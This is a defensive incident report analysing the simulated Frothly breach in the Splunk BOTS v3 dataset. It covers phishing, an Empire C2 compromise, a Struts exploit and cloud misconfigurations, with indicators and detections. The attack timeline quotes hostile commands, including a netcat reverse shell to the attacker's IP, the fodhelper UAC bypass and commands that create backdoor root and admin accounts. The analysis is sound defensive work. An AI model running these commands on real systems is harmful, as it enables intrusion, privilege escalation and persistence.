# Incident report: Frothly, 20 August 2018

**Data:** Splunk Boss of the SOC v3 (BOTS v3), a public dataset of a simulated breach at the fictional brewery Frothly. About 2 million events from 107 sourcetypes and 30 hosts, all on 20 August 2018.
**Analyst:** Bharathwaj Murali
**Times:** UTC. Every time comes from a query in [`queries/`](../queries/) whose saved output is in [`results/queries/`](../results/queries/).

## 1. Summary

The attacker phished one employee, took over his Microsoft 365 account and used his OneDrive to spread a malicious shortcut to colleagues. Three laptops ran it and joined the attacker's PowerShell Empire command-and-control server. From one of them (FYODOR-L) the attacker:

- elevated to admin, created a backdoor local admin and set up SYSTEM persistence
- used Fyodor's Microsoft 365 account to search every mailbox and to blind-copy company mail to an outside address
- exploited the Apache Struts inventory app on the Linux server hoth, got root with a kernel exploit, added a hidden uid 0 account, and took a copy of the SuiteCRM database

Three unrelated problems hit the AWS account and the network on the same day:

- a web_admin access key leaked on public GitHub was abused for crypto-mining (every launch failed)
- an S3 bucket holding the website code was public for 56 minutes, and an outsider overwrote the code archive
- a browser crypto-miner ran on one laptop and was blocked on another

**Impact:**

- Three Windows laptops compromised. One (FYODOR-L) fully controlled, with admin and SYSTEM access.
- One Linux server (hoth) compromised to root, with a uid 0 backdoor account left in place.
- Two Microsoft 365 accounts taken over: bgist and fyodor.
- Company-wide mailbox search run, and mail forwarding to an outside address set up.
- SuiteCRM database copied out.
- Website code archive replaced by an unknown party while the bucket was public.

## 2. Scope and data used

| Area | Data sources |
|---|---|
| Email and Microsoft 365 | `ms:o365:reporting:messagetrace`, `ms:o365:management`, `o365:management:activity`, `stream:smtp` |
| Windows endpoints | Sysmon (`XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`), `WinEventLog:Security`, `WinEventLog:Application`, Symantec Endpoint Protection (`symantec:ep:*`) |
| Linux server hoth | `osquery:results`, `syslog`, `Unix:UserAccounts`, `access_combined` |
| Network | `stream:http`, `stream:dns`, `stream:tcp`, Cisco AnyConnect flow data (`syslog` from splunkhwf) |
| AWS | `aws:cloudtrail`, `aws:s3:accesslogs`, `aws:cloudwatchlogs` |

Splunk Enterprise 10.4 ran in Docker under WSL with the dataset loaded as a pre-indexed app (see [`setup/`](../setup/)). No add-ons were installed, so the Sysmon XML fields are extracted with `rex` in each query.

## 3. Attack chain

### 3.1 Phishing and account takeover (T1566.002, T1078.004)

| Time | Event | Query |
|---|---|---|
| 09:48:17 | Email "Quarentined email" from `it@frothly.com` (look-alike of the real domain `froth.ly`) sent from **45.77.53.176** to bgist, bstoll, fyodor and ghoppy. It poses as an Outlook quarantine notice. All three links go to `frothly.com?rid=LKmcJ8B`; the `rid` parameter is how the GoPhish kit tracks clicks. | 01 |
| 09:48:53 | Bruce Gist's Edge browser on BGIST-L connects to www.frothly.com (45.77.53.176:80). | 02 |
| 09:51:09 | The attacker signs in to Microsoft 365 as **bgist** from **104.207.83.63**, 2 minutes after the click. | 03 |

The sign-in so soon after the click, from an IP Bruce never used, means the phishing page collected his password.

### 3.2 Malicious shortcut shared through OneDrive (T1105, T1204.002)

| Time | Event | Query |
|---|---|---|
| 09:57:17-33 | From the attacker's IP, bgist's OneDrive gets a folder "Birthday Pictures" with three photos and `Bruce Birthday Happy Hour Pics.lnk`. | 04 |
| 09:58:02 | An anonymous (no sign-in) sharing link is created for the folder. | 04 |
| 09:58:20 | Symantec on BGIST-L detects the synced `.lnk` as **Backdoor.PsEmpire** and deletes it. The alert reaches the console at 10:00:00. The cloud copy and the public link stay up. | 04b |
| 09:59:04-10:01:13 | The anonymous link is opened from 6 IPs. | 04 |

### 3.3 Empire stagers on three laptops (T1059.001, T1071.001)

The first stager on each host was started by Edge's `browser_broker.exe`, which is what happens when a shortcut is opened from the browser.

| Time | Host | User | Query |
|---|---|---|---|
| 09:59:48 | BSTOLL-L | BudStoll | 05 |
| 10:00:54 | ABUNGST-L | AlBungstein | 05 |
| 10:01:41 | FYODOR-L | FyodorMalteskesko | 05 |

I decoded the payloads offline with [`scripts/decode_enc.py`](../scripts/decode_enc.py), which never runs them. Output: [`results/decoded-payloads.txt`](../results/decoded-payloads.txt). Each payload:

- turns off PowerShell script-block logging by editing the cached Group Policy settings in memory, so the rest of the agent is not logged
- sets a fake Internet Explorer 11 User-Agent
- hides the C2 address as a nested base64 string, **https://45.77.53.176:443**, with Empire's default URIs `/admin/get.php`, `/login/process.php` and `/news.php`

Sysmon network events show beaconing to 45.77.53.176:443 from ABUNGST-L (1,070 connections, 10:01:04 to 11:59:24) and FYODOR-L (3,850 connections, 10:01:46 to 11:59:36). BSTOLL-L ran the stager twice (09:59:48 and 11:28:40), but its Sysmon config logs few network events, so its C2 traffic isn't visible (query 06).

### 3.4 Privilege escalation and persistence on FYODOR-L (T1548.002, T1136.001, T1053.005, T1546.003, T1562.004)

| Time | Event | Query |
|---|---|---|
| 10:07:03 | `whoami /groups` to check for admin rights | 07 |
| 10:07:05 | Writes `HKCU\Software\Classes\ms-settings\Shell\Open\command` and runs `fodhelper.exe`: a UAC bypass. A high-integrity agent starts at 10:07:06. The payload is stored in `HKCU\Software\Microsoft\Windows Update`. | 05, 07, D05 |
| 10:08:17 | `net user /add svcvnc` with the password in plain text on the command line | 07, D06 |
| 10:08:35 | `net localgroup administrators svcvnc /add` | 07, D06 |
| 10:09:44 | Scheduled task "Updater", daily as SYSTEM, running a payload stored in `HKLM\Software\Microsoft\Network` value `debug`. Run once at 10:11:00 and deleted at 10:16:54. | 07 |
| 10:15:27 | SYSTEM Empire agent started by `WmiPrvSE.exe` (URI `/login/process.php`). This fits Empire's WMI persistence. The WMI subscription itself is not in the searched data. | 05 |
| 10:46:29 | `netsh advfirewall set allprofiles state off` | 07, D07 |
| 10:47:16 | PowerShell downloads `/images/logos.png` (5.5 MB) from 45.77.53.176:**3333** | - |
| 10:47:41 | PowerShell writes `C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe` (SHA256 `EC732909...1FA838`). Given the timing and the folder name, logos.png was most likely an archive holding this tool. | - |
| 11:32:12 | Second fodhelper UAC bypass, new high-integrity agent (URI `/news.php`) | 05, 07 |

The name `iexeplorer.exe` is a misspelling of Internet Explorer meant to blend in (T1036.005).

### 3.5 Email collection with Fyodor's account (T1114.002, T1114.003, T1098.002)

| Time | Event | IP | Query |
|---|---|---|---|
| 10:47:43 | Sign-in as **fyodor** | 104.207.83.63 (same as the bgist takeover) | 03, D02 |
| 10:48:28 | `New-MailboxSearch` "SOX" across **all mailboxes** for `cromdale OR beer OR financial OR secret`, started at 10:48:32 | 104.207.83.63 | 08, D10 |
| 11:09:59 | `Add-RecipientPermission`: SendAs on ghoppy's mailbox for fyodor | 104.207.83.63 | 08 |
| 11:10:00 | `Add-MailboxPermission`: FullAccess on ghoppy's mailbox | 104.207.83.63 | 08 |
| 11:21:40 | `New-TransportRule` "SOX": blind-copy mail to **hyunki1984@naver.com** | 199.66.91.253 | 08, D10 |
| 11:27:29 | `Update-RoleGroupMember` Discovery Management: bstoll, fyodor, klagerfield | 199.66.91.253 | 08 |

The data doesn't show how the attacker got Fyodor's password. He also received the phishing email, and his laptop was running an Empire agent from 10:01, so either is possible. The transport rule has the same name as the attacker's mailbox search, which ties it to the attacker. It came from a new IP, 199.66.91.253. Sign-ins as fyodor from a Mac also come from that IP at 11:54, so it may be Fyodor's own network or a shared egress IP. It should be treated as attacker activity until that is ruled out.

### 3.6 Struts exploit, root and data theft on hoth (T1190, T1068, T1136.001, T1059.004, T1560.001, T1567.002)

From FYODOR-L, `iexeplorer.exe` sent commands to `http://192.168.9.30:8080/frothlyinventory/showcase.action`, the Struts 2 showcase app on hoth. osquery on hoth shows them running as the Tomcat service account **tomcat8 (uid 111)** (query 09).

| Time on hoth | Event | Query |
|---|---|---|
| 11:05:46 | `whoami`, then `id`, `groups`, `cat /etc/passwd` | 09, D08 |
| 11:07:17 | `useradd -ou 0 ... tomcat7` fails because tomcat8 is not root | 09 |
| 11:07:33 | `uname -a`, `lsb_release -a` to find the kernel version | 09 |
| 11:08:41 | Writes base64 source of a Linux kernel privilege-escalation exploit to `/tmp/colonel`. The decoded header says it targets the Ubuntu 16.04.4 kernel. | 09 |
| 11:10:59 | `base64 --decode /tmp/colonel > /tmp/colonel.c` | 09 |
| 11:12:58 | `mknod /tmp/backpipe p` | 09, D09 |
| 11:13:59 | Reverse shell `/bin/sh 0</tmp/backpipe \| nc 45.77.53.176 8088 1>/tmp/backpipe` | 09 |
| 11:14:22 | `gcc colonel.c -o colonelnew` | 10 |
| 11:16:58 | `./colonelnew`; root commands (euid 0) follow from 11:17:59 | 10 |
| 11:24:00 | `cat /tmp/loot.txt` as root | 10 |
| 11:24:44 | syslog: `useradd: new user: name=tomcat7, UID=0, GID=0`, a hidden root account | 10, D09 |
| 11:33:50 | Second reverse shell after the first one dropped | 09 |
| 11:41:44 | `tar czvf blargh.tgz suitecrm.sql loot.txt` | 10 |
| 11:42:43 | Moves `blargh.tgz` into the web root `/var/www/html/suitecrm/` | - |
| 11:44:38 | The archive is downloaded over HTTP by a PowerShell client with FYODOR-L's MAC address | - |
| 11:49:42 | `blargh.tgz` is uploaded to Fyodor's OneDrive by the sync client, where the stolen Microsoft 365 password can reach it | - |

The two netcat sessions to port 8088 sent 2.2 MB from hoth to the attacker and 82 KB the other way (Splunk Stream counts `bytes_in` from the connecting host, here hoth). That is far more than command output alone, so data probably also left through the reverse shell.

### 3.7 Leaked AWS key used for crypto-mining (T1552.001, T1078.004, T1496)

| Time | Event | Query |
|---|---|---|
| 09:16:12 | web_admin's key is used from 35.153.154.221 to try `CreateUser` and `CreateAccessKey`. Both are denied. | 11 |
| 09:16:22-09:28:54 | 139.198.18.205 (boto3 on Linux) makes **576 RunInstances** calls in **15 regions** for large compute types (c5.18xlarge, x1e.32xlarge, ...). Every call fails on limits or permissions. | 11, D11 |
| 09:16:55 | AWS opens a support case and emails bstoll: key `AKIAJOGCDXJ5NW5PXUPA` is public at `github.com/FrothlyBeers/BrewingIOT/.../MyDocuments/aws_credentials.bak` | 12 |
| 09:36:12 | bstoll sets the key Inactive, 20 minutes after the email | 12 |

The key was abused 43 seconds *before* AWS's email arrived. Scanners watching public GitHub commits find keys within minutes.

### 3.8 Public S3 bucket (T1530)

| Time | Event | Query |
|---|---|---|
| 13:01:46 | bstoll changes the ACL of `frothlywebcode` to give **AllUsers** access | 13, D12 |
| 13:02:44 | An outside IP, 52.66.146.128, uploads `OPEN_BUCKET_PLEASE_FIX.txt` (58 seconds later) | 13 |
| 13:03:46 | 35.182.246.222 downloads `frothly_html_memcached.tar.gz` (the website code)... | 13 |
| 13:04:17 | ...and **overwrites it** with its own version | 13 |
| 13:33:35, 14:23-14:25 | AWS IPs download the archive. These look like Frothly's servers pulling code, but the data doesn't confirm which servers they are. | 13 |
| 13:57:54 | ACL fixed after 56 minutes | 13 |
| 14:19:19 | bstoll uploads the archive again | 13 |

Anything deployed from that archive between 13:04 and 14:19 should be treated as tampered with.

### 3.9 Browser crypto-mining (T1496)

| Time | Event | Query |
|---|---|---|
| 13:27:17 | MKRAEUS-L looks up coinhive.com | 14 |
| 13:37:31-13:46:45 | Symantec on BTUN-L blocks "JSCoinminer Download" 54 times in Chrome and Edge | 14 |
| 13:37:33-14:05:20 | BSTOLL-L: Bud Stoll's Chrome connects to Coinhive's servers for 28 minutes | 14 |

Around the same time Bud was browsing brewertalk.com, Frothly's own forum. A Lambda DNS log at 15:07:20 shows a lookup of `minero.brewertalk.com`. The traffic is HTTPS, so the data cannot show which page loaded the miner. The forum is the likely source, but that is not proven.

### 3.10 Memcached opened to the internet

At 15:07:32 bstoll adds a rule to security group `sg-0849cdeb5ef571996` allowing **UDP 11211 from 0.0.0.0/0 and ::/0** (query 15). An open memcached UDP port can be used for very large DDoS amplification and should be closed.

## 4. Indicators

Also in [`results/iocs.csv`](../results/iocs.csv).

| Type | Value | Role |
|---|---|---|
| IP | 45.77.53.176 | Phishing sender and site, Empire C2 (443), tool download (3333), reverse shell (8088) |
| IP | 104.207.83.63 | Microsoft 365 sign-ins as bgist and fyodor |
| IP | 199.66.91.253 | Transport rule and role change as fyodor (see 3.5) |
| IP | 139.198.18.205, 35.153.154.221, 209.107.196.112, 82.102.18.111 | Use of the leaked AWS key |
| IP | 52.66.146.128, 35.182.246.222 | Wrote to the public S3 bucket |
| Domain | frothly.com, www.frothly.com | Look-alike phishing domain |
| Email | it@frothly.com | Phishing sender |
| Email | hyunki1984@naver.com | Blind-copy target of the transport rule |
| URL | https://45.77.53.176:443/admin/get.php, /login/process.php, /news.php | Empire C2 |
| URL | http://45.77.53.176:3333/images/logos.png | Tool download |
| File | Bruce Birthday Happy Hour Pics.lnk, SHA256 7A1367EFBA05B09E317909B040C3CDA972544212B4F9DB639237492351A3A405 | Empire shortcut |
| File | C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe, SHA256 EC732909362C261F3D7DF4A1D68BAA0133509FB36DD870658B0081108E1FA838 | Struts exploit tool |
| File | /tmp/colonel, /tmp/colonel.c, colonelnew, /tmp/backpipe, blargh.tgz | Tools and staged data on hoth |
| Account | svcvnc (FYODOR-L), tomcat7 uid 0 (hoth) | Backdoor accounts |
| Registry | HKCU\Software\Microsoft\Windows Update (Update), HKLM\Software\Microsoft\Network (debug) | Empire payload storage |
| Scheduled task | Updater | Persistence, later deleted |
| Exchange | Mailbox search "SOX", transport rule "SOX" | Collection |
| AWS key | AKIAJOGCDXJ5NW5PXUPA (web_admin) | Leaked on GitHub, deactivated 09:36:12 |
| User-Agent | Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko | Empire agent |

## 5. MITRE ATT&CK mapping

| Tactic | Technique | Where |
|---|---|---|
| Initial Access | T1566.002 Spearphishing Link | Fake quarantine email |
| Initial Access | T1078.004 Valid Accounts: Cloud Accounts | bgist and fyodor sign-ins, leaked AWS key |
| Initial Access | T1190 Exploit Public-Facing Application | Struts app on hoth |
| Execution | T1204.002 User Execution: Malicious File | .lnk from OneDrive |
| Execution | T1059.001 PowerShell | Empire stagers |
| Execution | T1059.004 Unix Shell | Commands and reverse shell on hoth |
| Persistence | T1136.001 Create Local Account | svcvnc, tomcat7 |
| Persistence | T1053.005 Scheduled Task | "Updater" |
| Persistence | T1546.003 WMI Event Subscription | SYSTEM agent from WmiPrvSE (likely) |
| Persistence | T1098.002 Additional Email Delegate Permissions | FullAccess and SendAs on ghoppy |
| Privilege Escalation | T1548.002 Bypass UAC | fodhelper and ms-settings |
| Privilege Escalation | T1068 Exploitation for Privilege Escalation | Kernel exploit on hoth |
| Defense Impairment | T1562.004 Disable or Modify System Firewall | netsh on FYODOR-L |
| Defense Impairment | T1562.002 Disable Windows Event Logging | Script-block logging switched off by each stager |
| Stealth | T1036.005 Match Legitimate Name | iexeplorer.exe |
| Stealth | T1027 Obfuscated Files | Encoded PowerShell, nested base64 C2 |
| Discovery | T1033 System Owner/User Discovery | whoami, id, groups |
| Discovery | T1082 System Information Discovery | uname, lsb_release |
| Lateral Movement | T1534 Internal Spearphishing | Shortcut shared from a colleague's OneDrive |
| Collection | T1114.002 Remote Email Collection | All-mailbox search |
| Collection | T1114.003 Email Forwarding Rule | Transport rule BCC |
| Collection | T1560.001 Archive via Utility | tar of the CRM database |
| Collection | T1530 Data from Cloud Storage | Public S3 bucket |
| Command and Control | T1071.001 Web Protocols | Empire over HTTPS |
| Command and Control | T1105 Ingress Tool Transfer | logos.png, colonel |
| Exfiltration | T1567.002 Exfiltration to Cloud Storage | blargh.tgz to OneDrive |
| Impact | T1496 Resource Hijacking | EC2 launch attempts, Coinhive |

ATT&CK v18 replaced the old Defense Evasion tactic with Stealth and Defense Impairment, and the tactic names above follow that. The Sigma rules carry technique tags only for those techniques, because `attack.defense-evasion` no longer passes `sigma check`.

## 6. What would have caught it earlier

Each detection in [`detections/`](../detections/) was run against the whole dataset. Results are in [`results/detections/`](../results/detections/). None of them uses an indicator from this report: no attacker IPs, file names or user names.

| Detection | Fires at | What it would have stopped |
|---|---|---|
| D01 Look-alike sender domain | **09:48:17** | Everything after it. The phish could have been pulled from inboxes before the click 36 seconds later. |
| D11 RunInstances failing in several regions | 09:16:22 | Shows the key is in someone else's hands 33 seconds before AWS's email |
| D03 Anonymous link to a shortcut file | 09:58:02 | Disabling the link here, 106 seconds before the first stager, would have saved all three laptops |
| Existing Symantec alert (query 04b) | 09:58:20 | Same, if it had been treated as "remove the file from OneDrive and kill the link", not "cleaned" |
| D04 Browser launches hidden PowerShell | 09:59:48 | Isolate the three laptops before any hands-on activity |
| D05 UAC bypass via ms-settings | 10:07:05 | |
| D06 Local admin from the command line | 10:08:17 | |
| D07 Firewall turned off | 10:46:29 | |
| D02 One IP signs in as several users | 10:47:43 | Fires as the second account is taken over |
| D10 All-mailbox search / mail copied outside | 10:48:28 | Fires as the search is created; the BCC rule 33 minutes later would also have been caught |
| D08 Web service account runs shell commands | 11:06:07 | The hoth exploit, about 11 minutes before root |
| D09 Named pipe / uid 0 account | 11:13:03 | |
| D12 S3 bucket opened to everyone | 13:01:46 | 58 seconds before the first outsider wrote to it |

**Main lessons:**

1. **Every step had a log.** The breach went unnoticed because nothing turned those logs into alerts, not because data was missing. D01, D03 and D04 all fire within 12 minutes of the phishing email.
2. **"Cleaned" is not "contained".** Symantec removed the shortcut from Bruce's disk while the same file stayed shared publicly from his OneDrive.
3. **Cloud keys are found in minutes.** The leaked key was used before the warning email arrived. Keys should never sit in repositories: use short-lived credentials and secret scanning before push.

## 7. Recommendations

**Contain**

- Reset passwords and revoke sessions for bgist, fyodor and ghoppy. Remove the "SOX" transport rule, the FullAccess and SendAs grants, and the Discovery Management change. Delete the "SOX" mailbox search.
- Isolate BSTOLL-L, ABUNGST-L and FYODOR-L. Reimage them rather than clean them, because SYSTEM-level persistence was set up.
- Remove svcvnc. On hoth, remove tomcat7 and rebuild the server.
- Block 45.77.53.176, 104.207.83.63 and frothly.com at the mail gateway, proxy and firewall.
- Rotate every credential stored on hoth and in SuiteCRM, since `loot.txt` and the database were taken.
- Redeploy the website from a known-good copy, not the archive that was in the bucket between 13:04 and 14:19.
- Close UDP 11211 to the internet.

**Fix the causes**

- Patch or remove the Struts showcase app. It should never be reachable from user laptops.
- Patch the hoth kernel.
- Block `.lnk` files (and other shortcut and script types) from being shared with anonymous links in OneDrive and SharePoint.
- Turn off anonymous links where they aren't needed.
- Enforce MFA on Microsoft 365 for all users, and alert on mailbox searches and transport rules.
- Use AWS IAM roles or short-lived credentials. Enable secret scanning in source control, and enable S3 Block Public Access at the account level.
- Stop users running as local admins, so that a UAC bypass gets nothing.
- Raise Sysmon network logging on BSTOLL-L to match the other hosts.

## 8. Limitations

- **False-positive rates are unknown.** The dataset is one day of mostly attack activity, so a detection firing only on the attack here does not mean it would be quiet in a real network. D02 and D06 in particular will need tuning.
- **Sigma rules are converted and validated in CI, not run here.** The data has no Splunk add-ons, so its field names don't match Sigma's. The SPL in `detections/splunk/` is the tested version.
- **One timestamp is inconsistent.** The `Unix:UserAccounts` snapshot labelled 10:24:58 already lists tomcat7, before the exploit started. syslog (11:24:44) and osquery agree on the later time, and the snapshots at 13:33 and 14:33 no longer list the account. I treat the 10:24:58 snapshot as mislabelled.
- **Not shown in the data:** how Fyodor's password was obtained; the WMI subscription behind the 10:15:27 SYSTEM agent; BSTOLL-L's C2 traffic; which page loaded the Coinhive script.
- **Probably unrelated:** an encoded PowerShell command on ABUNGST-L at 11:57:15 downloads `bit.ly/e0Mw9w` from the user's Downloads folder. It doesn't use the attacker's infrastructure or tooling, and I have left it out of the attack chain.
